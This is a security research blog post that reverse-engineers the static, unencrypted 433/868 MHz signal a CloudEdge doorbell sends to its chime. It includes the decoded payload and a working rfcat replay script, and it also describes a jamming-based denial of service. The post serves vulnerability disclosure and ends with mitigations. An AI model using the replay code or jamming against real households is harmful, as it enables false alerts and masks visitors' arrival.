---
layout: post
title: Reverse Engineering and Exploiting the Cloudedge Bell 24T Sub-GHz RF Signal Communications
subtitle: Taking Advantage of Unencrypted Static ASK/OOK Payloads to Bypass Authentication and Replay/Jam Indoor Chime Triggers Using SDR.
gh-repo: chezzuhhh.github.io
comments: true
mathjax: true
author: Chase Cooper
---

## Overview

Following up on my previous vulnerability analysis on the network communication stack of the CloudEdge Bell 24T Smart Doorbell, I shifted my focus to the sub-GHz radio frequency (RF) communications between the smart doorbell and its paired indoor chime.

The control and data planes for network communication suffered from severe cryptographic failures in their API implementation, and the RF signaling mechanism was no different, lacking cryptographic implementation entirely. By capturing and analyzing the raw transmission payloads, I discovered that the doorbell relies on completely static RF identifiers. This failure to implement rolling codes or cryptographic implementation (such as challenge-response protocols) allows an attacker to execute an authentication bypass by capture-replay and targeted jamming. This completely compromises the availability and intended functionality of the device without requiring physical access.

Here is a technical breakdown of how I captured, reverse-engineered, and successfully replayed the signal/payload:  


## Signal Capture & Observation

The first thing I needed to do was capture the raw RF transmissions generated when the doorbell button is physically pressed. I connected an RTL-SDR Blog v4 to SDR# and isolated the bandwidth to the targeted operating frequencies. I took the easy road next by looking up the device’s data sheet to find the operating frequencies instead of manually searching the spectrum while continually pressing the trigger button. Doing so resulted in discovering that the doorbell transmits the same payload across both the 433 MHz and 868 MHz bands simultaneously. The developers likely implemented this dual-band approach to guarantee signal delivery. By broadcasting simultaneously, the device maximizes its ability to penetrate physical barriers and mitigate effects from local interference.


<img width="970" height="306" alt="image" src="https://github.com/user-attachments/assets/24e63ed9-9bcf-47a7-a0b4-cfda6763ae66" />
_Live Fast Fourier Transform (FFT) view of 433MHz (left) & 868MHz (right) signals sent from the smart doorbell. Analyzed using SDR# + RTL-SDR._

After capturing the raw I/Q data during button presses, I imported the files into Universal Radio Hacker (URH) to view the time-domain waveforms and Inspectrum for a signal visualizer of the frequency-domain. This allowed me to visually break down the modulation and line encoding techniques utilized:

To figure out the symbol timing, I first pulled the raw capture into inspectrum. Measuring the cursor intervals across the bursts made it clear I was looking at On-Off Keying (OOK) driven by Pulse Width Modulation (PWM). From there, the math was straightforward: 
The shortest high pulse clocked in at 1 ms, resulting with as the base slot width (1000 Baud). I then brought the file into Universal Radio Hacker (URH) and set the demodulation to NRZ with a 1 ms symbol length. This forced URH to digitize the raw carrier bursts into 1 ms time slices (⁠1⁠ for carrier present, ⁠0⁠ for silent). 

<img width="970" height="807" alt="image" src="https://github.com/user-attachments/assets/0acce8a6-aa29-4933-bfe7-fc1717d2269f" />
_Deeper look into intercepted smart doorbell RF signal using URH (top), and Inspectrum (bottom)_

By decoding the waveform, I was able to map out the complete packet anatomy: the preamble, sync word, static payload, and tail. Because the payload remained static between button presses, the system is fundamentally vulnerable to replay attacks.

<img width="977" height="438" alt="image" src="https://github.com/user-attachments/assets/9f4242b6-add2-4c2f-95fb-abe999b827f5" />
Detailed look into the static payload across 5 transmissions using URH showcasing the complete lack of variance across multiple triggers.


## Exploiting the Replay Attack and Signal Jamming

With the packet anatomy and technical signal transmission parameters identified, I moved to exploit the static payload using a Yard Stick One software-controlled transceiver. Using the `rfcat` library, I dropped into an interactive python shell to configure the Yard Stick One to use the targeted environment parameters (listed below) and transmit the captured payload.

- **Frequencies:** 433 MHz and 868 MHz
- **Modulation:** Amplitude Shift Keying (ASK / OOK)
- **Line Encoding:** Pulse Width Modulation (PWM)
- **Symbol Time:** 1 ms
- **Symbol (Baud) Rate:** 1000 Baud (1 / 0.001)

```
from rflib import *

d = RfCat()
d.setFreq(433000000)
d.setMdmModulation(MOD_ASK_OOK)
d.setMdmDRate(1000)
d.setMdmSyncMode(0)
d.setMdmNumPreamble(0)

data = (
    "11000100011101110100010001000111010001000111011101000100010001110"
    "1000100011101110100010001000111010001000111011101000111011101000"
    "1000100011101110100010001000111010001000111011101000100010001000"
    "1000100011101110100010001110100010001000111011101000111010001000"
    "1000100011101110100010001110111010001110111010001110111011101000"
    "1000100010001110100010001000100010001000100011101000100010001110"
    "1000100010001000100010001000111010001110100010001110100011101110"
    "1000100010001000100010001000111010001000100010001000100010001"
)

transmission = data * 5

padding = len(transmission) % 8
if padding != 0:
    transmission += "0" * (8 - padding)

# string to bytes
payload = int(transmission, 2).to_bytes(len(transmission) // 8, byteorder='big')

d.makePktFLEN(len(payload))
d.RFxmit(payload)
d.setModeIDLE()
```

I successfully crafted and transmitted a synthetic signal that perfectly replicated the doorbell's original transmission. Because the receiver does not track state or validate signal freshness, it accepted the replayed payload as a legitimate and authenticated button press.

  
## Impact & Threat Model

By exploiting this lack of signal variance, an attacker can completely compromise the availability and intended function of the doorbell's physical alerting mechanism without requiring any physical interaction with either device.

- **Unauthorized Initiation:** Replaying the static payload allows an attacker to trigger the chime repeatedly at any time, causing a nuisance or creating false alerts inside the home.
- **Denial of Service (Jamming):** By continuously transmitting a continuous carrier wave or flooding the 433/868 MHz operational frequencies with the static payload, an attacker can completely deafen the chime receiver. This prevents legitimate doorbell presses from triggering the chime, effectively masking the arrival of visitors or malicious actors.


## Conclusion & Mitigations

This segment of the research highlights a critical, but common, architectural flaw in consumer IoT hardware: the reliance on static RF identifiers for sub-GHz communication. To resolve this vulnerability, the vendor must update the firmware and hardware logic to implement the following controls:

1. **Implement Rolling Codes:** The communication stack must utilize a rolling code scheme or a cryptographic challenge-response protocol. Each physical doorbell press must generate a mathematically unique, single-use payload.
2. **Time-Windowed Rejection:** The chime receiver must maintain a synchronized state with the transmitter and explicitly reject any previously used identifiers or payloads that fall outside an acceptable temporal window.
